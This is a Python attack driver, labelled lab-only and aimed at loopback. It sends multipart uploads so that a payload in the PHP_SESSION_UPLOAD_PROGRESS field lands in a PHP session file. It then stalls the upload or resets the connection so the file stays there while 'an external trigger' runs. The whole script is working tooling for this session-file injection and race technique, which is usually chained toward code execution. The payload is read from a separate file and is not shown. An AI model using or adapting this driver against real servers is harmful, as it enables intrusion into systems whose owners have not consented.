#!/usr/bin/env python3
"""Multipart upload driver with complete / slow / abort modes and live session-file
inspection. Lab-only; loopback. Byte-exact body so NUL/|/" in the payload survive."""
import argparse, os, socket, sys, time, hashlib

BOUNDARY = b"----ompopboundary7f3a"


def build_prefix(payload: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + payload + b"\r\n"
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="blob.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
    )


def build_suffix() -> bytes:
    return b"\r\n--" + BOUNDARY + b"--\r\n"


def sess_state(path):
    if not os.path.exists(path):
        return "MISSING"
    st = os.stat(path)
    with open(path, "rb") as f:
        data = f.read()
    return f"size={st.st_size} sha256={hashlib.sha256(data).hexdigest()[:16]} head={data[:60]!r}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=28896)
    ap.add_argument("--path", default="/lab_upload_sink.php")
    ap.add_argument("--sid", required=True)
    ap.add_argument("--payload-file", required=True)
    ap.add_argument("--size", type=int, default=1024 * 1024)
    ap.add_argument("--chunk", type=int, default=64 * 1024)
    ap.add_argument("--mode", choices=["complete", "slow", "slow-abort", "abort"], default="complete")
    ap.add_argument("--pause-at", type=int, default=196608)
    ap.add_argument("--pause-seconds", type=float, default=8.0)
    ap.add_argument("--session-file", required=True)
    ap.add_argument("--outdir", default=".")
    args = ap.parse_args()

    payload = open(args.payload_file, "rb").read()
    prefix = build_prefix(payload)
    suffix = build_suffix()
    total = len(prefix) + args.size + len(suffix)
    body_len = len(prefix) + args.size + len(suffix)

    req = (
        b"POST " + args.path.encode() + b" HTTP/1.1\r\n"
        b"Host: 127.0.0.1:28896\r\n"
        b"Cookie: PHPSESSID=" + args.sid.encode() + b"; om_frontend=" + args.sid.encode() + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        b"Content-Length: " + str(total).encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
    )
    os.makedirs(args.outdir, exist_ok=True)
    log = open(os.path.join(args.outdir, f"upload_{args.sid}_{args.mode}.log"), "w")

    def p(*a):
        line = " ".join(str(x) for x in a)
        print(line, flush=True)
        log.write(line + "\n"); log.flush()

    p(f"BODY prefix={len(prefix)} file={args.size} suffix={len(suffix)} total={total} payload_len={len(payload)}")
    p("before:", sess_state(args.session_file))

    s = socket.create_connection((args.host, args.port), timeout=60)
    t0 = time.time()
    s.sendall(req)
    s.sendall(prefix)
    p(f"t={time.time()-t0:.3f} sent headers+prefix")
    p("after-prefix:", sess_state(args.session_file))

    sent = 0
    blk = b"A" * args.chunk
    paused = False
    while sent < args.size:
        n = min(args.chunk, args.size - sent)
        s.sendall(blk[:n])
        sent += n
        if args.mode in ("slow", "slow-abort") and not paused and sent >= args.pause_at:
            paused = True
            p(f"t={time.time()-t0:.3f} PAUSE sent={sent}/{args.size}")
            p("during-pause:", sess_state(args.session_file))
            # let an external trigger run
            time.sleep(args.pause_seconds)
            if args.mode == "slow-abort":
                p(f"t={time.time()-t0:.3f} RST after pause sent={sent}/{args.size}")
                p("at-rst:", sess_state(args.session_file))
                s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
                s.close()
                time.sleep(1.0)
                p("after-rst:", sess_state(args.session_file))
                p("SLOW-ABORTED")
                return
            p(f"t={time.time()-t0:.3f} RESUME sent={sent}/{args.size}")
            p("after-pause:", sess_state(args.session_file))
        if args.mode == "abort" and sent >= args.pause_at:
            p(f"t={time.time()-t0:.3f} ABORT sent={sent}/{args.size} (RST)")
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
            s.close()
            p("after-abort:", sess_state(args.session_file))
            p("ABORTED")
            return
    s.sendall(suffix)
    p(f"t={time.time()-t0:.3f} sent suffix")
    r = s.recv(65536)
    p("response:", r.split(b"\r\n")[0] if r else b"(empty)")
    s.close()
    p("after-complete:", sess_state(args.session_file))


if __name__ == "__main__":
    main()
